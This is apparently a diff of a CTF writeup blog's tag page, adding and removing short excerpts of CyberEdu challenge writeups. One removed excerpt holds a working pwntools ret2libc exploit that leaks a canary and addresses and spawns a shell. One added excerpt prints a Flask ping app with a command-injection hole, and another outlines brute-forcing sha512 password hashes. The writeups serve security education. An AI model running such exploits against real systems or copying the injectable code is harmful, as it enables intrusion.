@@ -137,6 +137,67 @@
 
 <article class="post-entry tag-entry"> 
   <header class="entry-header">
+    <h2 class="entry-hint-parent">CyberEdu downloader-v1 Writeup
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Challenge overview Don’t you find it frustrating when you have uploaded some files on a website but you’re are not sure if the download button works? Me neither. But some people did. Is there even demand for such a service?
+Identifying the vulnerabilities In the GET request, we have a comment pointing us to flag.php, and the /file.php contains “GET ME”. Using gobuster, we find a /uploads/ directory. There’s a /uploads/index.html, but it’s empty. I kept trying to find a way to access uploads aimlessly, when I thought, what if I try to send an actual image’s link?
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-12 00:00:00 +0000 UTC'>January 12, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu downloader-v1 Writeup" href="https://irinasusca.github.io/writeup-blog/posts/downloaderv1-writeup/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">CyberEdu broken-login Writeup
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Challenge overview Intern season is up again and our new intern Alex had to do a simple login page. Not only the login page is not working properly, it is also highly insecure…
+Identifying the vulnerabilities This is how our POST requests are sent.
+Then, another GET is made: GET /auth?username=67616761&amp;password=9748ae63d43e39bb35e3060fbde9f34c731d4173f8b579441404bed6f485644335fca004f512c6602f77549e0aa5e23fec9a8b3979d61a73b9eb414ee9a27ca6.
+That’s a sha512 hash. I’m thinking, why don’t we try rockyou.txt? We can just sha512 each entry, send it, and see if we get a response with a content length higher than 0. That failed though.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-10 00:00:00 +0000 UTC'>January 10, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu broken-login Writeup" href="https://irinasusca.github.io/writeup-blog/posts/brokenlogin-writeup/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">CyberEdu file-crawler Writeup
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>I was stuck between starting to study heap properly or keep doing web challenges, and I guess here we are.
+Challenge overview Find the vulnerability and get the flag. The flag is located in a temporary folder.
+Identifying the vulnerabilities I inspected the original GET request with burp:
+Since the flag is located in a “temporary folder”, my first guess was /tmp/flag. I tried /local, and we get a TRY HARDER message.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-10 00:00:00 +0000 UTC'>January 10, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu file-crawler Writeup" href="https://irinasusca.github.io/writeup-blog/posts/filecrawler-writeup/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">CyberEdu ping-station Writeup
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Challenge overview Just another ping service to audit.
+We get an app(1).py file to look at.
+from flask import Flask, render_template, url_for, request, redirect import subprocess import re import string app = Flask(__name__) def is_valid_ip(ip): ipv = re.match(r&#34;^(\d{1,3})\.(\d{1,3})\.(\S{1,9})|(/s)\.(\d{1,3})$&#34;,ip) return bool(ipv) @app.route(&#39;/&#39;, methods=[&#39;POST&#39;, &#39;GET&#39;]) def index(): if request.method == &#39;POST&#39;: ip = request.form[&#39;content&#39;] if (is_valid_ip(ip)==True): for i in range(0,2): return &#39;&lt;pre&gt;&#39;&#43;subprocess.check_output(&#34;ping -c 4 &#34;&#43;ip,shell=True).decode()&#43;&#39;&lt;/pre&gt;&#39; break else: return&#34;That&#39;s not a valid IP&#34; else: return render_template(&#39;index.html&#39;) if __name__ == &#34;__main__&#34;: app.run(host = &#34;0.0.0.0&#34;) Identifying the vulnerabilities Looking at that &#34;ping -c 4 &#34;&#43;ip,shell=True), if we manage to smuggle a command past this is_valid_ip function, it will get executed.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-10 00:00:00 +0000 UTC'>January 10, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu ping-station Writeup" href="https://irinasusca.github.io/writeup-blog/posts/pingstation-writeup/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
     <h2 class="entry-hint-parent">CyberEdu jargon Writeup
     </h2>
   </header>
@@ -233,73 +294,6 @@ Identifying the vulnerabilities There’s a little problem though. The canary wa
   </div>
   <footer class="entry-footer"><span title='2026-01-03 00:00:00 +0000 UTC'>January 3, 2026</span></footer>
   <a class="entry-link" aria-label="post link to CyberEdu travel Writeup" href="https://irinasusca.github.io/writeup-blog/posts/travel-writeup/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu secret Writeup
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>Challenge overview Just another pwn challenge.
-Straight away, we’re dealing with a 64-bit PIE with canary enabled, and a format string vulnerability, and a gets(v1).
-The format string vulnerability is in main:
-And here is the gets(v1) that allows us to buffer overflow:
-So, ret2libc with a canary.
-The exploit We quickly gain shell locally using this script (first try!):
-# %15$p is the canary # %17$p is libc &#43; 0x1f68 # %19$p is PIE &#43; 0xb6d #to use gadgets we need to leak PIE base too name_payload = b&#34;%15$p.%17$p.%19$p&#34; p.recvuntil(b&#34;Name: &#34;) p.sendline(name_payload) p.recvuntil(b&#34;Hillo &#34;) leaks = p.recvline().strip() canary, libc_leak, pie_leak = leaks.split(b&#34;.&#34;) canary = int(canary, 16) libc_leak = int(libc_leak, 16) pie_leak = int(pie_leak, 16) print(f&#34;canary: {hex(canary)}&#34;) print(f&#34;libc leak: {hex(libc_leak)}&#34;) print(f&#34;pie leak: {hex(libc_leak)}&#34;) libc = libc_leak - 0x1f68 pie = pie_leak - 0xb6d #local binsh_offset = 0x17fe3c system_offset = 0x2b910 pop_rdi_ret = 0xca3 &#43; pie ret = 0x889 &#43; pie system = libc &#43; system_offset binsh = libc &#43; binsh_offset p.recvuntil(b&#34;Phrase: &#34;) payload = ( b&#34;a&#34;*136 &#43; #s1 p64(canary) &#43; b&#34;b&#34; * 8 &#43; #rbp p64(pop_rdi_ret) &#43; p64(binsh) &#43; p64(ret) &#43; p64(system) ) p.sendline(payload) p.interactive() For the remote instance, we most probably need to recalculate the offsets, for both the different glibc version and the format strings. I found the format string differences easily:
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2025-12-30 00:00:00 +0000 UTC'>December 30, 2025</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu secret Writeup" href="https://irinasusca.github.io/writeup-blog/posts/secret-writeup/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu offensive-honeypot Writeup
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>Challenge overview Just another pwn challenge.
-We’re dealing with a little game, and a canary.
-The win condition is that we beat the game, by killing the hacker player.
-Identifying the vulnerabilities The vulnerability here is that we can calculate the random number ourselves, very similarly to another challenge I wrote the writeup for here.
-Since we know the seed ourselves, we can get the same value for rand() that the game gets.
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2025-12-28 00:00:00 +0000 UTC'>December 28, 2025</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu offensive-honeypot Writeup" href="https://irinasusca.github.io/writeup-blog/posts/offensivehoneypot-writeup/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu darkmagic Writeup
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>Challenge overview In a distant land a dark magical power lay. We need a hero to defeat these dark forces.
-We’re working with a 64-bit binary with NX and Canary enabled, and a format string vulnerability. Let’s take a look at the binary.
-This is the vuln function, along which we have a getshell function that we need to redirect to. We can deduct that v5 is our canary being checked.
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2025-12-27 00:00:00 +0000 UTC'>December 27, 2025</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu darkmagic Writeup" href="https://irinasusca.github.io/writeup-blog/posts/darkmagic-writeup/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu get-access Writeup
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>Challenge overview Can you pwn this?
-Very interestingly, this challenge doesn’t come with any source files, and we just get a Username and Password prompt.
-Identifying the vulnerabilities The first thing I thought about was a buffer overflow.
-The Username seemed to read a specific amount of bytes, and the overflow would go into password, and password just didn’t crash anything, so it might’ve been the same situation.
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2025-12-27 00:00:00 +0000 UTC'>December 27, 2025</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu get-access Writeup" href="https://irinasusca.github.io/writeup-blog/posts/getaccess-writeup/"></a>
 </article>
 <footer class="page-footer">
   <nav class="pagination">
